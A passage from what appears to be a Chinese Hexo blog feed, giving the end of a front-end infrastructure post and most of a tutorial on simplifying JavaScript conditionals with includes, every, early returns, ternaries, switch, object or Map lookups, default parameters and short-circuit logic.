src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105978-9c61f61b-26cb-474e-a3fd-7187874549e7.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105978-9c61f61b-26cb-474e-a3fd-7187874549e7.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><strong>》</strong><br><a name="CHHyo"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>关于前端基建，在每个公司基建部分都会有所差异，有纯自动化一条龙的，有半自动化的等等；<br />但是如果我们细心的会发现，在几乎所有大中厂中，基建部分都不会少了 前端规范、前端文档、前端脚手架、前端组件库、前端工具库，所以如果实在是公司资源与业务限制，这几个还是值得去一探究竟的。<br />其实很多公司基建都不是一触而蹴的，基本上都是在常年累月的业务当中去 发现问题，定位问题，最后解决问题，然后在这个过程当中自然而然的沉淀出前端各个面向的基础设施，团队成员也会在这个过程当中找到适合自己的前端领域，并且深耕下去。<br />该系列会是一个持续更新系列，关于 前端基建，笔者主要会从如下图几个方面讲解，如果您想第一时间看到我的更新文章，可以<a href="https://juejin.cn/user/2305054774145918/columns">关注我</a>和我的《<a href="https://juejin.cn/column/7139087916306792462">前端要搞基建</a>》专栏<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105961-c45c173c-41ce-4af5-a4d6-9494fb10a98c.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157105961-c45c173c-41ce-4af5-a4d6-9494fb10a98c.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="wOatq"></a></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> 基建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>条件语句的优化</title>
      <link href="/2022/10/19/frontend/collection/skill/tiao-jian-yu-ju-de-you-hua/"/>
      <url>/2022/10/19/frontend/collection/skill/tiao-jian-yu-ju-de-you-hua/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>在日常的开发中，我们经常会编写一些条件语句，过多的 if…else 会导致代码难以理解和维护，今天来分享几个优化条件语句的小技巧！</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656768200664-7732e949-019b-42ac-b730-8d256e68053d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656768200664-7732e949-019b-42ac-b730-8d256e68053d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="nvHwa"></a></p><h2 id="1-Array-includes"><a href="#1-Array-includes" class="headerlink" title="1. Array.includes"></a>1. Array.includes</h2><p>来看下面的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">animal</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (animal == <span class="string">&#x27;lion&#x27;</span> || animal == <span class="string">&#x27;dog&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> animal;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;dog&#x27;</span>);</span><br></pre></td></tr></table></figure><p><br />在 test 方法中包含一个 if 语句，用来判断传入的参数 animal 是不是 lion 或者 dog。这么写从语法上是没问题的，但是如果 if 的判断条件中不只有两个动物，而是有四只动物。如果继续使用 || 与运算符来写的话，代码就会很难维护并且看起来非常不优雅：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (animal == <span class="string">&#x27;lion&#x27;</span> || animal == <span class="string">&#x27;dog&#x27;</span> || animal == <span class="string">&#x27;cow&#x27;</span> || animal == <span class="string">&#x27;cat&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> animal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />对于这种需要对同一个变量进行多次判断的条件语句，可以使用数组的<code>includes()</code>方法来优化，该方法可以用于确定数组中是否存在指定元素，如果存在指定的元素，就会返回 <code>true</code>，如果不存在就会返回 <code>false</code>。使用 <code>includes() </code>来修改写上面的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ([<span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;cow&#x27;</span>, <span class="string">&#x27;lion&#x27;</span>].<span class="title function_">includes</span>(animal)) &#123;</span><br><span class="line">    <span class="keyword">return</span> animal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这样代码看起来就简洁了很多，并且如果想继续增加其他的动物，只需在数组中继续增加元素即可。</p><p><a name="jodGR"></a></p><h2 id="2-Array-every"><a href="#2-Array-every" class="headerlink" title="2. Array.every"></a>2. Array.every</h2><p>来看下面的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cars = [</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&#x27;car1&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&#x27;car2&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;blue&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&#x27;car3&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;purple&#x27;</span> &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">cars</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> isAllblue = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> c <span class="keyword">of</span> cars) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isAllblue) <span class="keyword">break</span>;</span><br><span class="line">        isAllblue = (c.<span class="property">color</span> == <span class="string">&#x27;blue&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> isAllblue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(cars);</span><br></pre></td></tr></table></figure><p><br />JavaScript 中的数组提供了<code>every()</code>方法，该方法用于检查数组中所有元素是否满足给定条件。当每个数组元素都满足给定条件时会返回 <code>true</code>，否则会返回<code>false</code>。可以使用该方法来优化上面的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cars = [</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&#x27;car1&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&#x27;car2&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;blue&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&#x27;car3&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;purple&#x27;</span> &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">cars</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> cars.<span class="title function_">every</span>(<span class="function"><span class="params">c</span> =&gt;</span> c.<span class="property">color</span> == <span class="string">&#x27;blue&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(cars);</span><br></pre></td></tr></table></figure><p><a name="bHb3k"></a></p><h2 id="3-尽早-return"><a href="#3-尽早-return" class="headerlink" title="3. 尽早 return"></a>3. 尽早 return</h2><p>在 JavaScript 中，尽早 <code>return</code>是一种将函数体减少<code>else</code>语句的简单方法。来看下面的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">fruit, quantity</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> redFruits = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;strawberry&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;cranberries&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fruit) &#123;</span><br><span class="line">    <span class="keyword">if</span> (redFruits.<span class="title function_">includes</span>(fruit)) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;red&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (quantity &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;big quantity&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;No fruit!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(<span class="literal">null</span>); <span class="comment">// error: No fruits</span></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;apple&#x27;</span>); <span class="comment">// red</span></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;apple&#x27;</span>, <span class="number">20</span>); <span class="comment">// red, big quantity</span></span><br></pre></td></tr></table></figure><p>来使用这种模式来优化上面的代码，可以在无效条件时尽早返回：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">fruit, quantity</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> redFruits = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;strawberry&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;cranberries&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fruit) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;No fruit!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (redFruits.<span class="title function_">includes</span>(fruit)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;red&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (quantity &gt; <span class="number">10</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;big quantity&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以进一步优化，如果 redFruits 中不包含 fruit，就提前返回：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">fruit, quantity</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> redFruits = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;strawberry&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;cranberries&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fruit) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;No fruit!&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!redFruits.<span class="title function_">includes</span>(fruit)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;red&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (quantity &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;big quantity&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />可以看到，使用这种模式可以消除不必要的<code>else</code>语句，使得函数更加清晰和简洁。</p><p><a name="qChhR"></a></p><h2 id="4-三元运算符"><a href="#4-三元运算符" class="headerlink" title="4. 三元运算符"></a>4. 三元运算符</h2><p>对于上面例子中的函数，可以使用 JavaScript 的三元运算符来重构：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">IsRed</span>(<span class="params">someObject</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">typeof</span> someObject !== <span class="string">&#x27;object&#x27;</span> || someObject.<span class="property">color</span> !== <span class="string">&#x27;Red&#x27;</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />对于上面的三元表达式，还可以进行简化：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">IsRed</span>(<span class="params">someObject</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> !(<span class="keyword">typeof</span> someObject !== <span class="string">&#x27;object&#x27;</span> || someObject.<span class="property">color</span> !== <span class="string">&#x27;Red&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />对于这种<code>if...else</code>块中都分别只有一个表达式的情况，就可以使用三元表达式来简化<code>if...else</code>语句。</p><p><a name="k49Zr"></a></p><h2 id="5-switch…case"><a href="#5-switch…case" class="headerlink" title="5. switch…case"></a>5. switch…case</h2><p>来看下面的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printCars</span>(<span class="params">color</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (color === <span class="string">&#x27;red&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> [<span class="string">&#x27;Rcar1&#x27;</span>, <span class="string">&#x27;Rcar2&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (color === <span class="string">&#x27;blue&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> [<span class="string">&#x27;Bcar1&#x27;</span>, <span class="string">&#x27;Bcar2&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (color === <span class="string">&#x27;purple&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> [<span class="string">&#x27;Pcar1&#x27;</span>, <span class="string">&#x27;Pcar2&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />对于这种 if 的判断条件中都是针对一个变量进行判断的情况，可以使用<code>switch...case</code>来简化：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printCars</span>(<span class="params">color</span>) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (color) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;red&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> [<span class="string">&#x27;Rcar1&#x27;</span>, <span class="string">&#x27;Rcar2&#x27;</span>];</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;blue&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> [<span class="string">&#x27;Bcar1&#x27;</span>, <span class="string">&#x27;Bcar2&#x27;</span>];</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;purple&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> [<span class="string">&#x27;Pcar1&#x27;</span>, <span class="string">&#x27;Pcar2&#x27;</span>];</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      <span class="keyword">return</span> [];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="BYUiF"></a></p><h2 id="6-Map-x2F-Object"><a href="#6-Map-x2F-Object" class="headerlink" title="6. Map&#x2F;Object"></a>6. Map&#x2F;Object</h2><p>对于上面的代码，可以使用对象来继续优化：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> carColor = &#123;</span><br><span class="line">    <span class="attr">red</span>: [<span class="string">&#x27;Rcar1&#x27;</span>, <span class="string">&#x27;Rcar2&#x27;</span>],</span><br><span class="line">    <span class="attr">blue</span>: [<span class="string">&#x27;Bcar1&#x27;</span>, <span class="string">&#x27;Bcar2&#x27;</span>],</span><br><span class="line">    <span class="attr">purple</span>: [<span class="string">&#x27;Pcar1&#x27;</span>, <span class="string">&#x27;Pcar2&#x27;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printcars</span>(<span class="params">color</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> carColor[color] || [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">printcars</span>());       <span class="comment">// []</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">printcars</span>(<span class="string">&#x27;red&#x27;</span>));  <span class="comment">// [&#x27;Rcar1&#x27;，&#x27;Rcar2&#x27;]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">printcars</span>(<span class="string">&#x27;blue&#x27;</span>)); <span class="comment">// [&#x27;Bcar1&#x27;，&#x27;Bcar2&#x27;]</span></span><br></pre></td></tr></table></figure><p><br />也可以使用 Map 来实现相同的结果：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> carColor = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line">    .<span class="title function_">set</span>(<span class="string">&#x27;red&#x27;</span>, [<span class="string">&#x27;Rcar1&#x27;</span>, <span class="string">&#x27;Rcar2&#x27;</span>])</span><br><span class="line">    .<span class="title function_">set</span>(<span class="string">&#x27;blue&#x27;</span>, [<span class="string">&#x27;Bcar1&#x27;</span>, <span class="string">&#x27;Bcar2&#x27;</span>])</span><br><span class="line">    .<span class="title function_">set</span>(<span class="string">&#x27;purple&#x27;</span>, [<span class="string">&#x27;Pcar1&#x27;</span>, <span class="string">&#x27;Pcar2&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printcars</span>(<span class="params">color</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> carColor.<span class="title function_">get</span>(color) || [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">printcars</span>());       <span class="comment">// []</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">printcars</span>(<span class="string">&#x27;red&#x27;</span>));  <span class="comment">// [&#x27;Rcar1&#x27;，&#x27;Rcar2&#x27;]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">printcars</span>(<span class="string">&#x27;blue&#x27;</span>)); <span class="comment">// [&#x27;Bcar1&#x27;，&#x27;Bcar2&#x27;]</span></span><br></pre></td></tr></table></figure><p><a name="NtN8P"></a></p><h2 id="7-默认函数参数和解构"><a href="#7-默认函数参数和解构" class="headerlink" title="7. 默认函数参数和解构"></a>7. 默认函数参数和解构</h2><p>来看下面的代码：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">flower, quantity</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!flower) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> num = quantity || <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;num&#125;</span>朵<span class="subst">$&#123;flower&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">check</span>(<span class="string">&#x27;玫瑰&#x27;</span>);    <span class="comment">// 1朵玫瑰</span></span><br><span class="line"><span class="title function_">check</span>(<span class="string">&#x27;茉莉&#x27;</span>, <span class="number">2</span>); <span class="comment">// 2朵茉莉</span></span><br></pre></td></tr></table></figure><p><br />可以使用函数默认参数来简化上面的代码：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">flower, quantity = <span class="number">1</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!flower) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;quantity&#125;</span>朵<span class="subst">$&#123;flower&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">check</span>(<span class="string">&#x27;玫瑰&#x27;</span>);    <span class="comment">// 1朵玫瑰</span></span><br><span class="line"><span class="title function_">check</span>(<span class="string">&#x27;茉莉&#x27;</span>, <span class="number">2</span>); <span class="comment">// 2朵茉莉</span></span><br></pre></td></tr></table></figure><p><br />那如果<code>flower</code>参数是一个对象怎么办呢？来看下面的代码：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">flower</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flower &amp;&amp; flower.<span class="property">name</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(flower.<span class="property">name</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;unknown&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">check</span>(<span class="literal">undefined</span>);  <span class="comment">// unknown</span></span><br><span class="line"><span class="title function_">check</span>(&#123;&#125;);  <span class="comment">// unknown</span></span><br></pre></td></tr></table></figure><p><br />可以从对象中解构需要的属性：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">&#123;name&#125; = &#123;&#125;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="property">log</span> (name || <span class="string">&#x27;unknown&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">check</span>(<span class="literal">undefined</span>);  <span class="comment">// unknown</span></span><br><span class="line"><span class="title function_">check</span>(&#123;&#125;);  <span class="comment">// unknown</span></span><br><span class="line"><span class="title function_">check</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;玫瑰&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span> &#125;);  <span class="comment">// 玫瑰</span></span><br></pre></td></tr></table></figure><p><br />在函数中需要<code>flower</code>对象中的<code>name</code>属性，可以使用<code>&#123;name&#125;</code>来解构该参数。除此之外，还是用<code>&#123;&#125;</code>来作为参数的默认值，这样在<code>check(undefined)</code>时，也就是参数不是对象时，参数默认为一个空对象，否则就会报错，因为<code>undefined</code>中没有<code>name</code>属性。</p><p><a name="wmCKq"></a></p><h2 id="8-逻辑与运算符"><a href="#8-逻辑与运算符" class="headerlink" title="8. 逻辑与运算符"></a>8. 逻辑与运算符</h2><p>来看下面的代码：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a &lt; <span class="number">0</span> &amp;&amp; b &gt; <span class="number">100</span> &amp;&amp; c === <span class="number">10</span>) &#123;</span><br><span class="line">  <span class="title function_">fn</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br 